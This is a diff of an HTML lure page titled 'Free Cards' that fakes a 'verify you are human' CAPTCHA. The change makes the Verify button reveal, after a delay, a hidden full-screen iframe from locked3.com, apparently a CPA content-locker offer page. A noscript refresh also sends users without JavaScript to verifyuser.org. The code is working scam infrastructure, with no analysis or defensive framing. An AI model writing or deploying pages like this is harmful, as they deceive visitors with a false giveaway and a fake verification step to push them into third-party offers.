@@ -7,7 +7,7 @@
   <link rel="stylesheet" href="bootstrap.min.css">
   <link rel="stylesheet" href="style.css">
   <title>Free Cards</title>
-
+  
   
   
   <noscript><meta http-equiv="refresh" content="0;url=https://verifyuser.org/noscript" /></noscript>
@@ -107,13 +107,14 @@
 
     <div class="BASE2 p-3 pt-0 gone" id="base2">
      
+     <iframe class="gone p-2 pt-4" id="iframe" src="https://locked3.com/cl/i/2l256l"   seamless style="height:100%; max-height: auto;width:100%;max-width: 800px;position:absolute;top:0px;left:0px; z-index:5;"></iframe>
    
    <div id="wrn" class="wrn mb-2 w-100 p-2 text-dark gone">
   To make sure that you are a human and not a robot that must perform some tasks, please click on “Verify”.
   
 </div>
    
-   <button type="submit" class="btn btn-success " id="captcha" onclick="og_load();">Verify</button>
+   <button type="submit" class="btn btn-success " id="captcha" onclick="gocpa();">Verify</button>
 
 
    <div id="banau" class="text-light bg-dark con d-flex p-1 w-100 justify-content-around">
@@ -198,12 +199,14 @@
 
     }
     function gocpa(){
+      var
+      dd = document.getElementById("iframe");
       
       setTimeout(function(){
-        location.href='preview.html';
+    dd.classList.remove("gone");
         
         
-      },500);
+      },1000);
       
       
       
@@ -214,4 +217,4 @@
   </script>
 <script src="main.js"></script>
 </body>
-</html>
+  </html>
